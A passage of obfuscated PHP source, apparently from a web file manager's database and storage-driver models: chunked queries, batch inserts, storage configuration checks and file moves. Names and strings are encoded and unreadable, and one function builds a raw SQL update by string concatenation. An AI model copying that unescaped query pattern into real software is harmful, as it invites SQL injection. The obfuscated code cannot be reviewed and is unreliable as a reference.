$this->chunkEventCheck(count($ãÈ¬£óè)); $ãÈ¬£óè = array(); } } $this->chunkEventSet(); } public function saveAllEach($áîîÓÁî) { $©Îå÷‚í =& $_SERVER[®»±”ó²]; $†óëĞü¥ = $this->tablePrefix . $this->tableName; foreach ($áîîÓÁî as $’ºæÁÒÖ) { if (!is_array($’ºæÁÒÖ) || count($’ºæÁÒÖ) != 4) { continue; } $²Ğ‹¥ö¹ = $’ºæÁÒÖ[0] . $©Îå÷‚í[457] . $’ºæÁÒÖ[1] . $©Îå÷‚í[121]; $‹ğ„ñÅ = $’ºæÁÒÖ[2] . $©Îå÷‚í[457] . $’ºæÁÒÖ[3] . $©Îå÷‚í[121]; $àó÷êû = "\165\160\x64\x61\164\x65\40{$†óëĞü¥}\40\163\145\164\x20{$‹ğ„ñÅ}\40\x77\150\145\x72\x65\x20{$²Ğ‹¥ö¹}\x3b"; $this->execute($àó÷êû); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¾“õ¹ı® = false, $¿‰â‡›ë = false) { $this->_chunkEvent = $¾“õ¹ı®; $this->_chunkEventParam = $¿‰â‡›ë; } private function chunkEventCheck($¤Ç˜¨) { if (!$this->_chunkEvent) { return; } $Ô°‹Âå˜ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ô°‹Âå˜[$_SERVER[®»±”ó²][458]] = $¤Ç˜¨; Hook::trigger($this->_chunkEvent, $Ô°‹Âå˜); } public function addAll($ÍæÄ‘ó÷, $ŸÀ„¯Å£ = array(), $ôÁ¤Í¡ë = false) { $”È®Ô¤¤ =& $_SERVER[®»±”ó²]; ignore_timeout(); $ ù¯ÅÚˆ = self::SQL_WHERE_IN_CHUNK; if (empty($ÍæÄ‘ó÷)) { $this->error = think_lang($”È®Ô¤¤[351]); return !1; } $ŸÀ„¯Å£ = $this->_parseOptions($ŸÀ„¯Å£); foreach ($ÍæÄ‘ó÷ as $õ„ÏÈø => $€¨Ú¬ßÕ) { $ÍæÄ‘ó÷[$õ„ÏÈø] = $this->_facade($€¨Ú¬ßÕ); $this->_beforeInsert($ÍæÄ‘ó÷[$õ„ÏÈø], $ŸÀ„¯Å£); } if (method_exists($this->db, $”È®Ô¤¤[352])) { for ($ö˜•‡˜ì = 0; $ö˜•‡˜ì < count($ÍæÄ‘ó÷); $ö˜•‡˜ì += $ ù¯ÅÚˆ) { $‘–¬’õÌ = array_slice($ÍæÄ‘ó÷, $ö˜•‡˜ì, $ ù¯ÅÚˆ); if (!is_array($‘–¬’õÌ) || count($‘–¬’õÌ) == 0) { break; } $¤ù¾óï¿ = $this->db->insertAll($‘–¬’õÌ, $ŸÀ„¯Å£, $ôÁ¤Í¡ë); $this->chunkEventCheck(count($‘–¬’õÌ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÍæÄ‘ó÷ as $õ„ÏÈø => $€¨Ú¬ßÕ) { $¤ù¾óï¿ = $this->db->insert($€¨Ú¬ßÕ, $ŸÀ„¯Å£, $ôÁ¤Í¡ë); } $this->commit(); } if (!1 !== $¤ù¾óï¿) { $ Æó˜Ãù = $this->getLastInsID(); if ($ Æó˜Ãù) { return $ Æó˜Ãù; } } return $¤ù¾óï¿; } public function save($½äê³ä“ = '', $ü¦ŒöÏ = array()) { $°¡ç›½” =& $_SERVER[®»±”ó²]; $Ğ½ò˜öè = self::SQL_WHERE_IN_CHUNK; $¢•Ø÷µ… = $this->optionsValue(); $Æ…Ô±«š = $this->findWhereField($¢•Ø÷µ…); if (!$Æ…Ô±«š) { return parent::save($½äê³ä“, $ü¦ŒöÏ); } $Šûçê¨¥ = 0; $í…íÓÈ = $¢•Ø÷µ…[$°¡ç›½”[355]][$Æ…Ô±«š][1]; $í…íÓÈ = is_array($í…íÓÈ) ? $í…íÓÈ : array(); $Ç³Âµª³ = count($í…íÓÈ); for ($ÀùóºáÍ = 0; $ÀùóºáÍ < $Ç³Âµª³; $ÀùóºáÍ += $Ğ½ò˜öè) { $š„Ä½Êá = array_slice($í…íÓÈ, $ÀùóºáÍ, $Ğ½ò˜öè); if (!is_array($š„Ä½Êá) || count($š„Ä½Êá) == 0) { break; } $¢•Ø÷µ…[$°¡ç›½”[355]][$Æ…Ô±«š][1] = $š„Ä½Êá; $this->optionsValue($¢•Ø÷µ…); $Šûçê¨¥ += parent::save($½äê³ä“, $ü¦ŒöÏ); $this->chunkEventCheck(count($š„Ä½Êá)); } $this->chunkEventSet(); return $Šûçê¨¥; } public function add($ûËÜÚôñ = '', $Ÿó„––ô = array(), $õËÏô· = false) { if ($this->addTaskStatus && is_array($ûËÜÚôñ)) { $this->addTaskData[] = $ûËÜÚôñ; return; } return parent::add($ûËÜÚôñ, $Ÿó„––ô, $õËÏô·); } public function parseWhereLike($ÂÆ§ıÔê, $áÕöˆ²¾ = '', $—íó³Œ¿ = false, &$¹úáòÕ = false) { $À‡ÊÙØˆ =& $_SERVER[®»±”ó²]; $­••Úæ¸ = $GLOBALS[$À‡ÊÙØˆ[6]][$À‡ÊÙØˆ[459]]; if (!$­••Úæ¸[$À‡ÊÙØˆ[460]]) { return $ÂÆ§ıÔê; } if (!is_array($ÂÆ§ıÔê)) { return $ÂÆ§ıÔê; } $úéŠÜ¨  = array(); $è–íØŞÓ = 0; foreach ($ÂÆ§ıÔê as $Ñüßø»× => $Á–òÚê·) { if (is_array($Á–òÚê·) && count($Á–òÚê·) == 2 && $Á–òÚê·[0] == $À‡ÊÙØˆ[461] && is_string($Á–òÚê·[1]) && substr($Á–òÚê·[1], 0, 1) == $À‡ÊÙØˆ[462] && substr($Á–òÚê·[1], strlen($Á–òÚê·[1]) - 1, 1) == $À‡ÊÙØˆ[462]) { $¹úáòÕ = !0; $§‘â•öù = is_string($Ñüßø»×) ? $Ñüßø»× : $áÕöˆ²¾; $²Ù¨ÙÅÙ = substr($Á–òÚê·[1], 1, strlen($Á–òÚê·[1]) - 2); $²Ù¨ÙÅÙ = $this->db->escapeString($²Ù¨ÙÅÙ); if (!strpos($§‘â•öù, $À‡ÊÙØˆ[10])) { $§‘â•öù = $À‡ÊÙØˆ[463] . $§‘â•öù . $À‡ÊÙØˆ[463]; } $Â‡İäÅ­ = $À‡ÊÙØˆ[223] . $²Ù¨ÙÅÙ . $À‡ÊÙØˆ[223]; $²Ù¨ÙÅÙ = str_replace(array($À‡ÊÙØˆ[10], $À‡ÊÙØˆ[464], $À‡ÊÙØˆ[11]), $À‡ÊÙØˆ[465], $²Ù¨ÙÅÙ); if ($­••Úæ¸[$À‡ÊÙØˆ[466]]) { $Â‡İäÅ­ = $À‡ÊÙØˆ[467] . $²Ù¨ÙÅÙ . $À‡ÊÙØˆ[468]; if ($­••Úæ¸[$À‡ÊÙØˆ[469]]) { $Â‡İäÅ­ = $À‡ÊÙØˆ[468] . $²Ù¨ÙÅÙ . $À‡ÊÙØˆ[467]; } } $úéŠÜ¨ [$è–íØŞÓ] = $À‡ÊÙØˆ[470] . $§‘â•öù . $À‡ÊÙØˆ[471] . $Â‡İäÅ­ . $À‡ÊÙØˆ[472]; $è–íØŞÓ++; continue; } if (is_array($Á–òÚê·)) { $áÕöˆ²¾ = is_string($Ñüßø»×) ? $Ñüßø»× : $áÕöˆ²¾; $Á–òÚê· = $this->parseWhereLike($Á–òÚê·, $áÕöˆ²¾, !0, $¹úáòÕ); } if (is_numeric($Ñüßø»×)) { $úéŠÜ¨ [$è–íØŞÓ] = $Á–òÚê·; $è–íØŞÓ++; } else { $úéŠÜ¨ [$Ñüßø»×] = $Á–òÚê·; } } if ($¹úáòÕ && !$—íó³Œ¿) { } return $úéŠÜ¨ ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ûş½¥Œó = array()) { $øÔ¸®œ¿ =& $_SERVER[®»±”ó²]; $ëÖ˜¹ = self::SQL_WHERE_IN_CHUNK; $êÓé§ğ¹ = $this->optionsValue(); $÷¦‚º”¯ = $this->findWhereField($êÓé§ğ¹); if (!$÷¦‚º”¯ || isset($êÓé§ğ¹[$øÔ¸®œ¿[370]]) || isset($êÓé§ğ¹[$øÔ¸®œ¿[430]])) { return parent::select($Ûş½¥Œó); } $œÆÀÅîñ = $êÓé§ğ¹[$øÔ¸®œ¿[355]][$÷¦‚º”¯][1]; $œÆÀÅîñ = is_array($œÆÀÅîñ) ? $œÆÀÅîñ : array(); $¶û«Öü© = null; for ($‚òÄÏ = 0; $‚òÄÏ < count($œÆÀÅîñ); $‚òÄÏ += $ëÖ˜¹) { $Ô—à´·¡ = array_slice($œÆÀÅîñ, $‚òÄÏ, $ëÖ˜¹); if (!is_array($Ô—à´·¡) || count($Ô—à´·¡) == 0) { break; } $êÓé§ğ¹[$øÔ¸®œ¿[355]][$÷¦‚º”¯][1] = $Ô—à´·¡; $this->optionsValue($êÓé§ğ¹); $ç»Â¼á = parent::select($Ûş½¥Œó); if (!$ç»Â¼á) { continue; } $¶û«Öü© = is_array($¶û«Öü©) ? $¶û«Öü© : array(); $¶û«Öü© = array_merge($¶û«Öü©, $ç»Â¼á); } return $¶û«Öü©; } public function delete($±Ëîº’Ï = array()) { $Œô ä¥¢ =& $_SERVER[®»±”ó²]; $îë£ğÂâ = self::SQL_WHERE_IN_CHUNK; $ßÑºÅæ = $this->optionsValue(); $ú°éµ™Á = $this->findWhereField($ßÑºÅæ); if (!$ú°éµ™Á) { return parent::delete($±Ëîº’Ï); } $ÎÜ€Œ = 0; $¸éñöª­ = $ßÑºÅæ[$Œô ä¥¢[355]][$ú°éµ™Á][1]; $¸éñöª­ = is_array($¸éñöª­) ? $¸éñöª­ : array(); for ($½ÈÍÖ¨ï = 0; $½ÈÍÖ¨ï < count($¸éñöª­); $½ÈÍÖ¨ï += $îë£ğÂâ) { $Ïäµ‘™ = array_slice($¸éñöª­, $½ÈÍÖ¨ï, $îë£ğÂâ); if (!is_array($Ïäµ‘™) || count($Ïäµ‘™) == 0) { break; } $ßÑºÅæ[$Œô ä¥¢[355]][$ú°éµ™Á][1] = $Ïäµ‘™; $this->optionsValue($ßÑºÅæ); $ÎÜ€Œ += parent::delete($±Ëîº’Ï); } return $ÎÜ€Œ; } private function findWhereField($²Ú‘Ö´Ş) { $Ñ«ÏÊğË =& $_SERVER[®»±”ó²]; $Çù¯ÃÏø = self::SQL_WHERE_IN_CHUNK; if (!is_array($²Ú‘Ö´Ş) || !is_array($²Ú‘Ö´Ş[$Ñ«ÏÊğË[355]])) { return !1; } foreach ($²Ú‘Ö´Ş[$Ñ«ÏÊğË[355]] as $ÕŞ‰µÜñ => $ÚÛó£½) { if (is_array($ÚÛó£½) && isset($ÚÛó£½[0]) && is_string($ÚÛó£½[0]) && strtolower($ÚÛó£½[0]) == $Ñ«ÏÊğË[7] && is_array($ÚÛó£½[1]) && count($ÚÛó£½[1]) > $Çù¯ÃÏø) { ignore_timeout(); return $ÕŞ‰µÜñ; } } return !1; } public function setMasterDB($Ÿ‡‚éš = true) { think_config($_SERVER[®»±”ó²][473], $Ÿ‡‚éš); } } goto EçÅƒÜÙ„; aïŠÕ«ÈÈ­: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\163\x6f\x75\x72\x63\145\x53\145\143\x72\145\164\x4c\x69\x73\164"; public $field = array("\163\157\165\162\143\145\111\x44", "\x74\171\x70\x65\111\x44", "\143\162\145\x61\164\145\x55\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\x73\164\x6f\x72\x61\147\x65\114\x69\x73\x74"; public $field = array("\156\141\155\x65", "\163\151\x7a\145\x4d\x61\x78", "\x73\x79\163\x74\x65\x6d", "\144\145\146\x61\x75\x6c\x74", "\x64\162\x69\x76\145\x72", "\143\157\x6e\146\151\x67"); public function listData($ÁÙ³°ü = false, $»…«ò¼² = "\x6d\x6f\x64\151\x66\x79\124\x69\x6d\145", $ø œîı“ = false) { $å‘Ôâí¶ =& $_SERVER[®»±”ó²]; $Ëş†Œ = parent::listData($ÁÙ³°ü, $»…«ò¼², $ø œîı“); if ($ÁÙ³°ü) { return $Ëş†Œ; } $ÚğÖÜ×á = array(); if ($GLOBALS[$å‘Ôâí¶[2326]]) { $ÚğÖÜ×á = $this->ioSizeUseGet(array_to_keyvalue($Ëş†Œ, $å‘Ôâí¶[12], $å‘Ôâí¶[477])); } foreach ($Ëş†Œ as $¥€÷Ô« => $¨Ö˜ùÆ”) { unset($Ëş†Œ[$¥€÷Ô«][$å‘Ôâí¶[6]]); $Ëş†Œ[$¥€÷Ô«][$å‘Ôâí¶[1980]] = isset($ÚğÖÜ×á[$¨Ö˜ùÆ”[$å‘Ôâí¶[477]]]) ? $ÚğÖÜ×á[$¨Ö˜ùÆ”[$å‘Ôâí¶[477]]] : 0; } return $Ëş†Œ; } public function ioSizeUseGet($×¸±—é‰) { $˜®Ïà‚ =& $_SERVER[®»±”ó²]; if (!$×¸±—é‰) { return array(); } $·õ¶²ıŸ = $˜®Ïà‚[2327] . implode($˜®Ïà‚[50], $×¸±—é‰); $Ê¤û€‡ = Cache::get($·õ¶²ıŸ); if ($Ê¤û€‡) { return $Ê¤û€‡; } $äÄÌ† ˜ = array($˜®Ïà‚[904] => $˜®Ïà‚[477], $˜®Ïà‚[2328] => $˜®Ïà‚[79]); $’¿€é·† = array($˜®Ïà‚[904] => array($˜®Ïà‚[7], $×¸±—é‰)); $Ê¤û€‡ = Model($˜®Ïà‚[872])->field($äÄÌ† ˜)->where($’¿€é·†)->group($˜®Ïà‚[904])->select(); $Ê¤û€‡ = array_to_keyvalue($Ê¤û€‡, $˜®Ïà‚[477], $˜®Ïà‚[79]); Cache::set($·õ¶²ıŸ, $Ê¤û€‡, 600); return $Ê¤û€‡; } public function getConfig($¦¾Ø”Õ¿) { $ñÀ±íà = parent::listData($¦¾Ø”Õ¿); $Ãø´ß„ó = _get($ñÀ±íà, $_SERVER[®»±”ó²][6], array()); if ($Ãø´ß„ó && !is_array($Ãø´ß„ó)) { $Ãø´ß„ó = json_decode($Ãø´ß„ó, !0); } return $Ãø´ß„ó; } public function update($–¸ÌÉ’, $ÒŸè³×º) { $¹Æä°ÕÌ =& $_SERVER[®»±”ó²]; $¥Ê„Ğ¿¸ = $ÒŸè³×º[$¹Æä°ÕÌ[32]]; $ãÄ¥Äõ½ = array_to_keyvalue(parent::listData(), $¹Æä°ÕÌ[32]); if (isset($ãÄ¥Äõ½[$¥Ê„Ğ¿¸]) && $ãÄ¥Äõ½[$¥Ê„Ğ¿¸][$¹Æä°ÕÌ[477]] != $–¸ÌÉ’) { return !1; } $this->checkPwd($–¸ÌÉ’, $ÒŸè³×º); if (isset($ÒŸè³×º[$¹Æä°ÕÌ[2329]]) && $ÒŸè³×º[$¹Æä°ÕÌ[2329]] == $¹Æä°ÕÌ[91]) { $this->checkConfig($ÒŸè³×º); } unset($ÒŸè³×º[$¹Æä°ÕÌ[2329]]); $Æ‡ŸÅõ = parent::update($–¸ÌÉ’, $ÒŸè³×º); if ($Æ‡ŸÅõ && $ÒŸè³×º[$¹Æä°ÕÌ[37]]) { foreach ($ãÄ¥Äõ½ as $û¼Òğ¬š) { if ($û¼Òğ¬š[$¹Æä°ÕÌ[37]] && $û¼Òğ¬š[$¹Æä°ÕÌ[477]] != $–¸ÌÉ’) { parent::update($û¼Òğ¬š[$¹Æä°ÕÌ[477]], array($¹Æä°ÕÌ[37] => 0)); } } $this->updateBackup($–¸ÌÉ’, $ãÄ¥Äõ½); } return $Æ‡ŸÅõ; } public function add($Òå­‘Ìã) { $ÏÕõØğ… =& $_SERVER[®»±”ó²]; $ú¡«ò = array_to_keyvalue(parent::listData(), $ÏÕõØğ…[32]); if (isset($ú¡«ò[$Òå­‘Ìã[$ÏÕõØğ…[32]]])) { return !1; } $this->checkConfig($Òå­‘Ìã); $¯Ûñ¨¸• = parent::insert($Òå­‘Ìã); if ($¯Ûñ¨¸• && $Òå­‘Ìã[$ÏÕõØğ…[37]]) { foreach ($ú¡«ò as $ŞÓˆï“º) { if ($ŞÓˆï“º[$ÏÕõØğ…[37]]) { parent::update($ŞÓˆï“º[$ÏÕõØğ…[477]], array($ÏÕõØğ…[37] => 0)); } } $this->updateBackup($¯Ûñ¨¸•, $ú¡«ò); } return $¯Ûñ¨¸•; } public function updateBackup($œ‚úÚŞ¤, $ßÍ°ëÖ) { $ÑÕ»›ºó =& $_SERVER[®»±”ó²]; if ($œ‚úÚŞ¤ == $ÑÕ»›ºó[91]) { return; } $àÏŠóÀà = Model($ÑÕ»›ºó[828])->config(); $Õîí¿·Ÿ = $àÏŠóÀà[$ÑÕ»›ºó[832]]; if ($àÏŠóÀà[$ÑÕ»›ºó[1760]] != $ÑÕ»›ºó[91] || $Õîí¿·Ÿ == $œ‚úÚŞ¤) { return; } if ($Õîí¿·Ÿ != $ÑÕ»›ºó[91]) { $”ª±Òì¶ = array(); foreach ($ßÍ°ëÖ as $¬ºÏÙô¼) { if ($œ‚úÚŞ¤ == $¬ºÏÙô¼[$ÑÕ»›ºó[477]]) { continue; } $”ª±Òì¶[] = $¬ºÏÙô¼[$ÑÕ»›ºó[477]]; } if ($”ª±Òì¶ && in_array($Õîí¿·Ÿ, $”ª±Òì¶)) { return; } } $Ğ—‰÷ˆ = Model($ÑÕ»›ºó[851])->get($ÑÕ»›ºó[858]); $Ğ—‰÷ˆ = json_decode($Ğ—‰÷ˆ, !0); if (!$Ğ—‰÷ˆ) { return; } $Ğ—‰÷ˆ[$ÑÕ»›ºó[832]] = $œ‚úÚŞ¤; Model($ÑÕ»›ºó[851])->set(array($ÑÕ»›ºó[858] => $Ğ—‰÷ˆ)); } public function checkPwd($ûïÁ˜‹, &$©Ï„şÆš) { $ØÙ­…¼Ç =& $_SERVER[®»±”ó²]; if (empty($©Ï„şÆš[$ØÙ­…¼Ç[6]])) { return; } $ü˜’Æ„µ = $©Ï„şÆš[$ØÙ­…¼Ç[6]]; if (!is_array($ü˜’Æ„µ)) { $ü˜’Æ„µ = json_decode($ü˜’Æ„µ, !0); } $‚œø¿©Ç = $ØÙ­…¼Ç[12]; $”Ä¥…ö† = array($ØÙ­…¼Ç[2330], $ØÙ­…¼Ç[2331], $ØÙ­…¼Ç[976]); foreach ($”Ä¥…ö† as $‘¯ü²¦Â) { if (isset($ü˜’Æ„µ[$‘¯ü²¦Â])) { $‚œø¿©Ç = $‘¯ü²¦Â; break; } } if (!$‚œø¿©Ç) { return; } $£ï÷ïªÁ = $this->getConfig($ûïÁ˜‹); $’È•á¤Â = $£ï÷ïªÁ[$‚œø¿©Ç]; $¡ŒàÙ•æ = $ü˜’Æ„µ[$‚œø¿©Ç]; if ($¡ŒàÙ•æ == str_repeat($ØÙ­…¼Ç[223], strlen($’È•á¤Â))) { $ü˜’Æ„µ[$‚œø¿©Ç] = $’È•á¤Â; $©Ï„şÆš[$ØÙ­…¼Ç[6]] = json_encode($ü˜’Æ„µ); } else { if ($¡ŒàÙ•æ != $’È•á¤Â) { $©Ï„şÆš[$ØÙ­…¼Ç[2329]] = $ØÙ­…¼Ç[91]; } } } public function checkConfig(&$®ÖÌï’¨, $ø§È»ÂÍ = false) { $Ï÷¿–• =& $_SERVER[®»±”ó²]; $×°ñèœü = strtolower($®ÖÌï’¨[$Ï÷¿–•[98]]); $òÓê‹…÷ = $®ÖÌï’¨[$Ï÷¿–•[6]]; if (!is_array($òÓê‹…÷)) { $òÓê‹…÷ = json_decode($òÓê‹…÷, !0); } foreach ($òÓê‹…÷ as $Õ¸ëçŠÁ => $üÀ¦ÇÖ) { if (is_string($üÀ¦ÇÖ)) { $òÓê‹…÷[$Õ¸ëçŠÁ] = trim($üÀ¦ÇÖ); } } $òÓê‹…÷[$Ï÷¿–•[2332]] = rand_string(6); $Ä¹ÔÚ­Ê = $GLOBALS[$Ï÷¿–•[6]][$Ï÷¿–•[92]][$Ï÷¿–•[912]]; $Œˆ­¡¦¯ = isset($Ä¹ÔÚ­Ê[$×°ñèœü]) ? $Ä¹ÔÚ­Ê[$×°ñèœü] : ucfirst($×°ñèœü); $’‚äª¢Æ = $Ï÷¿–•[77] . $Œˆ­¡¦¯; if (!$Œˆ­¡¦¯ || !class_exists($’‚äª¢Æ)) { if ($ø§È»ÂÍ) { return LNG($Ï÷¿–•[2333]); } write_log(array($Ï÷¿–•[2334], $®ÖÌï’¨, get_caller_info()), $Ï÷¿–•[216]); show_json(LNG($Ï÷¿–•[2333]), !1, $®ÖÌï’¨); } $ Ä¬Ğ§œ = new $’‚äª¢Æ($òÓê‹…÷); $û«÷öêé = rtrim($òÓê‹…÷[$Ï÷¿–•[1274]], $Ï÷¿–•[8]) . $Ï÷¿–•[8]; if (in_array($×°ñèœü, $ Ä¬Ğ§œ->objectDriver)) { try { if (!$ Ä¬Ğ§œ->isBucketCors() && !$ Ä¬Ğ§œ->setBucketCors()) { $¢ËÓìİ€ = LNG($Ï÷¿–•[2335]); $¢ËÓìİ€ .= $Ï÷¿–•[2336] . LNG($Ï÷¿–•[2337]); } } catch (Exception $ê€»©ŸÃ) { $¢ËÓìİ€ = $ê€»©ŸÃ->getMessage(); } if (isset($¢ËÓìİ€)) { return $this->_parseError($¢ËÓìİ€, $×°ñèœü, $ø§È»ÂÍ); } if ($×°ñèœü == $Ï÷¿–•[68] && !$ Ä¬Ğ§œ->checkRegion()) { return $this->_parseError(LNG($Ï÷¿–•[2338]), $×°ñèœü, $ø§È»ÂÍ); } } else { if ($×°ñèœü == $Ï÷¿–•[2339]) { if ($ Ä¬Ğ§œ->ftpPath) { $™Û²îŠ = trim($û«÷öêé, $Ï÷¿–•[8]); if (stripos($™Û²îŠ, trim($ Ä¬Ğ§œ->ftpPath, $Ï÷¿–•[8])) !== 0) { $û«÷öêé = $ Ä¬Ğ§œ->ftpPath . $Ï÷¿–•[8] . ($™Û²îŠ ? $™Û²îŠ . $Ï÷¿–•[8] : $Ï÷¿–•[12]); } } } } $âªŒ¸øâ = $ Ä¬Ğ§œ->getPath($û«÷öêé . $Ï÷¿–•[1278]); try { if ($×°ñèœü == $Ï÷¿–•[109]) { $ Ä¬Ğ§œ->mkdir($û«÷öêé); } $•›±Ú­­ = $ Ä¬Ğ§œ->mkfile($âªŒ¸øâ); if (!$•›±Ú­­) { $¢ËÓìİ€ = LNG($Ï÷¿–•[2335]); } } catch (Exception $ê€»©ŸÃ) { $¢ËÓìİ€ = $ê€»©ŸÃ->getMessage(); } if (isset($¢ËÓìİ€)) { return $this->_parseError($¢ËÓìİ€, $×°ñèœü, $ø§È»ÂÍ); } $òÓê‹…÷[$Ï÷¿–•[1274]] = $û«÷öêé; $®ÖÌï’¨[$Ï÷¿–•[6]] = json_encode($òÓê‹…÷); $®ÖÌï’¨[$Ï÷¿–•[98]] = $Œˆ­¡¦¯; return !0; } private function _parseError($â”ó¼â, $ˆ‹µØÖ§, $±òŒåµ = false) { $Öæ¸÷Îì =& $_SERVER[®»±”ó²]; if ($ˆ‹µØÖ§ == $Öæ¸÷Îì[68] && stripos($â”ó¼â, $Öæ¸÷Îì[2340])) { $â¡Ëš÷ = explode($Öæ¸÷Îì[10], $â”ó¼â); $’…´áŒ = isset($â¡Ëš÷[1]) ? $â¡Ëš÷[1] : $Öæ¸÷Îì[12]; $äİâÁÎã = array($Öæ¸÷Îì[2341] => LNG($Öæ¸÷Îì[2342]), $Öæ¸÷Îì[2343] => LNG($Öæ¸÷Îì[2344])); if (isset($äİâÁÎã[$’…´áŒ])) { $â”ó¼â = $äİâÁÎã[$’…´áŒ]; } } if (stripos($â”ó¼â, $Öæ¸÷Îì[2345]) === 0) { $ÙÎ£²â = strpos($â”ó¼â, $Öæ¸÷Îì[178]); if ($ÙÎ£²â === !1) { $ÙÎ£²â = strpos($â”ó¼â, $Öæ¸÷Îì[4]); } if ($ÙÎ£²â !== !1) { $â”ó¼â = substr($â”ó¼â, $ÙÎ£²â + 1); } } $â”ó¼â = LNG($Öæ¸÷Îì[1281]) . $â”ó¼â; if ($±òŒåµ) { return $â”ó¼â; } show_json($â”ó¼â, !1); } public function driverListSystem() { $ê˜ö²—í =& $_SERVER[®»±”ó²]; $¸ë¨§Ÿ = parent::listData(); $«À–Ö›ƒ = array(); foreach ($¸ë¨§Ÿ as $´²Ò³) { unset($´²Ò³[$ê˜ö²—í[234]], $´²Ò³[$ê˜ö²—í[88]]); if (!is_array($´²Ò³[$ê˜ö²—í[6]])) { $´²Ò³[$ê˜ö²—í[6]] = json_decode($´²Ò³[$ê˜ö²—í[6]], !0); } $«À–Ö›ƒ[] = $´²Ò³; } return $«À–Ö›ƒ; } public function defaultDriver() { $§âÌŠÛğ =& $_SERVER[®»±”ó²]; $ğé³”ğ‚ = parent::listData(); $Èİ±šÂË = array_filter_by_field($ğé³”ğ‚, $§âÌŠÛğ[37], 1); $Èİ±šÂË = $Èİ±šÂË[0]; if (!$Èİ±šÂË) { return array(); } if (!is_array($Èİ±šÂË[$§âÌŠÛğ[6]])) { $Èİ±šÂË[$§âÌŠÛğ[6]] = json_decode($Èİ±šÂË[$§âÌŠÛğ[6]], !0); } return $Èİ±šÂË; } public function driverInfo($Ÿ»áÇùÛ) { $“ÇÆ˜Ìè =& $_SERVER[®»±”ó²]; $öäò´¦’ = array_to_keyvalue(parent::listData(), $“ÇÆ˜Ìè[477]); if (!isset($öäò´¦’[$Ÿ»áÇùÛ])) { return !1; } $ŸÕ¶Îé‘ = $öäò´¦’[$Ÿ»áÇùÛ]; if (!is_array($ŸÕ¶Îé‘[$“ÇÆ˜Ìè[6]])) { $ŸÕ¶Îé‘[$“ÇÆ˜Ìè[6]] = json_decode($ŸÕ¶Îé‘[$“ÇÆ˜Ìè[6]], !0); } return $ŸÕ¶Îé‘; } public function remove($ÆÅË˜ì¦) { $this->removeShareItems($ÆÅË˜ì¦); return parent::remove($ÆÅË˜ì¦); } public function removeWithFile($Š®îŸË¥, $³¿šÓ×Ø, $šçµ”Ï¿, $í©ÃÃû» = false) { $ò²±Áß– =& $_SERVER[®»±”ó²]; $±›Ã†Ì‰ = array($ò²±Áß–[904] => $Š®îŸË¥); $ä¾‰öÂ‡ = Model($ò²±Áß–[557])->where($±›Ã†Ì‰)->count(); $™ÃåÑñ = Model($ò²±Áß–[557])->where($±›Ã†Ì‰)->sum($ò²±Áß–[79]); $°×³€¿­ = $³¿šÓ×Ø . $ò²±Áß–[2346] . $Š®îŸË¥; $şÚñ¡Ù = LNG($³¿šÓ×Ø == $ò²±Áß–[636] ? $ò²±Áß–[2347] : $ò²±Áß–[2348]); $ÇºÎ²¹ı = new TaskFileTransfer($°×³€¿­, $ò²±Áß–[216], $ä¾‰öÂ‡, $şÚñ¡Ù . $ò²±Áß–[464] . $šçµ”Ï¿[$ò²±Áß–[32]] . $ò²±Áß–[215] . $Š®îŸË¥); $ÇºÎ²¹ı->task[$ò²±Áß–[844]] = (double) $™ÃåÑñ; $ˆñ‘àß´ = KodIO::defaultDriver(); $¦‹éü¢ó = $ˆñ‘àß´[$ò²±Áß–[477]]; $–­¯‰Äú = $şÚ¤Ë¶¿ = $¸Çåü‘ = array(); $¶…ıÒÖ– = Model($ò²±Áß–[233])->where($±›Ã†Ì‰)->field($ò²±Áß–[2349])->select(); foreach ($¶…ıÒÖ– as $’×¡Ÿ»·) { $ÛÌ ø…Î = $’×¡Ÿ»·[$ò²±Áß–[554]]; if ($í©ÃÃû») { $şÚ¤Ë¶¿[] = $ÛÌ ø…Î; continue; } $Éİ¾û÷İ = $’×¡Ÿ»·[$ò²±Áß–[87]]; $¥˜îñŞš = get_path_father($Éİ¾û÷İ); $¸Çåü‘[] = $¥˜îñŞš; $¥˜îñŞš = str_replace("\x7b\x69\157\x3a{$Š®îŸË¥}\175\x2f", "\173\151\157\x3a{$¦‹éü¢ó}\x7d\57", $¥˜îñŞš); if (!IO::exist($Éİ¾û÷İ)) { $–­¯‰Äú[] = $ÛÌ ø…Î; $ÇºÎ²¹ı->updateFileEnd($’×¡Ÿ»·[$ò²±Áß–[32]], $’×¡Ÿ»·[$ò²±Áß–[79]]); write_log($ò²±Áß–[2350] . $Éİ¾û÷İ, $ò²±Áß–[1923]); continue; } $¹êü‹× = IO::move($Éİ¾û÷İ, $¥˜îñŞš, REPEAT_RENAME); if (!$¹êü‹×) { $şÚ¤Ë¶¿[] = $ÛÌ ø…Î; $ÇºÎ²¹ı->updateFileEnd($’×¡Ÿ»·[$ò²±Áß–[32]], $’×¡Ÿ»·[$ò²±Áß–[79]]); write_log($ò²±Áß–[2351] . $Éİ¾û÷İ, $ò²±Áß–[1923]); continue; } $±›Ã†Ì‰ = array($ò²±Áß–[554] => $ÛÌ ø…Î); $‹é‘åò = array($ò²±Áß–[904] => $¦‹éü¢ó, $ò²±Áß–[87] => $¹êü‹×); Model($ò²±Áß–[233])->where($±›Ã†Ì‰)->save($‹é‘åò); } $ÂõÂÓï¢ = $ÇºÎ²¹ı->task; if (!$í©ÃÃû») { Cache::set($°×³€¿­, $ÂõÂÓï¢); } $ÇºÎ²¹ı->end(); $–­¯‰Äú = array_unique($–­¯‰Äú); $şÚ¤Ë¶¿ = array_unique($şÚ¤Ë¶¿); if (!$í©ÃÃû» && ($–­¯‰Äú || $şÚ¤Ë¶¿)) { $¶Èş×ö¯ = array(); if ($–­¯‰Äú) { $¶Èş×ö¯[] = sprintf(LNG($ò²±Áß–[2352]), count($–­¯‰Äú)); } if ($şÚ¤Ë¶¿) { $¶Èş×ö¯[] = sprintf(LNG($ò²±Áß–[2353]), count($şÚ¤Ë¶¿)); } 